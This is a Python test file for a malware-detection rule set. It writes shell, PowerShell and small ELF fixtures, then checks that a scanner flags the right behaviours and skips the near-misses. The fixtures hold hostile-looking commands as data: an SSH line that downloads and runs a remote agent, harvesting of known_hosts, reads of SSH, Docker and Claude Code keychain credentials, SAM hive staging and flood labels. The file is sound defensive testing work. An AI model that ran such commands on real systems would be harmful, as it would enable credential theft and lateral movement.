#!/usr/bin/env python3
"""Focused rule controls; generated ELF fixtures are scanned, never executed."""
import json
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
SSH = 'micro-behaviors/communications/ssh/client::'
DEPLOY = 'objectives/lateral-movement/ssh/propagation::ssh-host-discovery-detached-download'
XOR = 'micro-behaviors/data/encoding/xor::x64-xor-decimal-address-character-loop'
CONFIG = 'micro-behaviors/fs/path/config/app::ssh-config-path-reference'
PG = 'micro-behaviors/process/info/name::postgres-name-reference'
DOCKER = 'micro-behaviors/fs/path/secret-config::docker-config'
CREDENTIAL = 'micro-behaviors/fs/path/credential::'


def elf(payload):
    # ELF64 ET_EXEC, one RX PT_LOAD, deliberately no section headers.
    size = 256 + len(payload)
    header = struct.pack('<16sHHIQQQIHHHHHH', b'\x7fELF\x02\x01\x01' + bytes(9),
                         2, 62, 1, 0x400100, 64, 0, 0, 64, 56, 1, 0, 0, 0)
    segment = struct.pack('<IIQQQQQQ', 1, 5, 0, 0x400000, 0x400000, size, size, 4096)
    return (header + segment).ljust(256, b'\0') + payload


def sectioned_elf(payload):
    names = b'\0.text\0.shstrtab\0'
    content = bytearray(elf(payload) + names)
    shoff = (len(content) + 7) & ~7
    content.extend(bytes(shoff - len(content)))
    struct.pack_into('<Q', content, 40, shoff)
    struct.pack_into('<HHH', content, 58, 64, 3, 2)
    content.extend(bytes(64))
    content.extend(struct.pack('<IIQQQQIIQQ', 1, 1, 6, 0x400100, 256, len(payload), 0, 0, 16, 0))
    content.extend(struct.pack('<IIQQQQIIQQ', 7, 3, 0, 0, 256 + len(payload), len(names), 0, 0, 1, 0))
    return bytes(content)


remote = "ssh -o BatchMode=yes -i key root@host 'cd /tmp;wget -qO agent.sh http://server/agent;sh agent.sh &'\n"
read_hosts = "grep -oE '[0-9.]+' /root/.ssh/known_hosts\n"
pattern = bytes.fromhex('0F B6 54 24 18 31 EA 8D 72 D0 40 80 FE 09 76 05 80 FA 2E 75 3C 42 88 14 33 49 83 C6 01 49 83 FE 15 75 86')
variant = bytearray(pattern)
variant[4], variant[32] = 0x28, 0x20
no_xor = pattern.replace(bytes.fromhex('31 EA'), bytes.fromhex('09 EA'))
no_address_filter = pattern.replace(bytes.fromhex('80 FA 2E'), bytes.fromhex('80 FA 3A'))
# filename, content, required IDs, forbidden IDs
cases = [
    ('deploy.sh', '#!/bin/sh\n' + read_hosts + remote,
     [DEPLOY, SSH+'ssh-key-detached-shell-command', SSH+'ssh-remote-download-command'], []),
    ('remote-only.sh', '#!/bin/sh\n' + remote,
     [SSH+'ssh-key-detached-shell-command'], [DEPLOY]),
    ('inventory.sh', '#!/bin/sh\n' + read_hosts, [], [DEPLOY, CONFIG]),
    ('download-only.sh', '#!/bin/sh\n' + read_hosts + remote.replace(';sh agent.sh &', ''),
     [SSH+'ssh-remote-download-command'], [DEPLOY, SSH+'ssh-key-detached-shell-command']),
    ('config.sh', '#!/bin/sh\ncat /root/.ssh/config\n', [CONFIG], []),
    ('ssh-directory.sh', '#!/bin/sh\nls /root/.ssh/\n',
     [CREDENTIAL+'ssh-dir', CREDENTIAL+'ssh-directory-literal'], []),
    ('docker-unix.sh', '#!/bin/sh\ncat /root/.docker/config.json\n', [DOCKER], []),
    ('docker-windows.ps1', r'Get-Content C:\Users\user\.DOCKER\CONFIG.JSON', [DOCKER], []),
    ('db-url.elf', elf(b'\xc3\0postgres://user@host/db\0'), [], [PG]),
    ('ddos-label.elf', elf(b'\xc3\0ddos_udp\0'),
     ['micro-behaviors/communications/flood::udp-flood-attack-label'], []),
    ('flood-label.elf', elf(b'\xc3\0UDP_FLOOD\0'),
     ['micro-behaviors/communications/flood::udp-flood-attack-label'], []),
    ('ordinary-udp.elf', elf(b'\xc3\0udp port\0'), [],
     ['micro-behaviors/communications/flood::udp-flood-attack-label']),
    ('process.elf', elf(b'\xc3\0postgres\0'), [PG], []),
    ('xor.elf', elf(pattern), [XOR], []),
    ('xor-variant.elf', elf(bytes(variant)), [XOR], []),
    ('no-xor.elf', elf(no_xor), [], [XOR]),
    ('no-address-filter.elf', elf(no_address_filter), [], [XOR]),
    ('chdir.elf', sectioned_elf(bytes.fromhex('B8 50 00 00 00 0F 05 C3')),
     ['micro-behaviors/fs/directory/chdir::syscall-chdir'],
     ['micro-behaviors/os/syscall/invoke::syscall-chdir']),
    ('sam.ps1', r'Get-Content C:\Windows\Temp\SAM.save',
     ['micro-behaviors/fs/path/account-db::windows-temp-sam-hive-staging'],
     [CREDENTIAL+'windows-temp-sam-hive-staging']),
    ('keychain.sh', '#!/bin/sh\nsecurity find-generic-password -s "Claude Code-credentials"\n',
     ['micro-behaviors/os/security/keychain::claude-code-keychain-service-name'],
     [CREDENTIAL+'claude-code-keychain-service-name']),
]
with tempfile.TemporaryDirectory(dir=ROOT, prefix='cegg-controls-') as tmp:
    directory = Path(tmp)
    for name, content, _, _ in cases:
        (directory / name).write_bytes(content.encode() if isinstance(content, str) else content)
    result = subprocess.run(['cleave', '--disable', 'radare2', '--traits-dir', str(ROOT), '--format', 'json', str(directory)],
                            check=True, capture_output=True, text=True)
    decoder = json.JSONDecoder()
    remaining = result.stdout.strip()
    files = []
    while remaining:
        report, end = decoder.raw_decode(remaining)
        files.extend(report.get('files', [report]))
        remaining = remaining[end:].lstrip()
    findings = {Path(f['path']).name: {t['id'] for t in f.get('traits', [])}
                for f in files}
    failures = []
    for name, _, required, forbidden in cases:
        actual = findings.get(name, set())
        failures.extend(f'{name}: missing {trait}' for trait in required if trait not in actual)
        failures.extend(f'{name}: unexpected {trait}' for trait in forbidden if trait in actual)
    if failures:
        raise SystemExit('\n'.join(failures))
print(f'PASS: {len(cases)} positive and near-miss controls')
